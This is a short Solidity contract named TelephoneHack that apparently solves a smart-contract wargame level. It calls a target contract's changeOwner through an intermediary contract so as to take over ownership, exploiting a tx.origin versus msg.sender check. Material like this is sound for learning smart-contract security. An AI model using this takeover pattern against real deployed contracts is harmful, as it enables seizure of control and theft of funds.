// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneHack {

    Telephone target;

    constructor(address _target) {
        target = Telephone(_target);
    }

    function attack() public {
        
        target.changeOwner(msg.sender);
    }

}
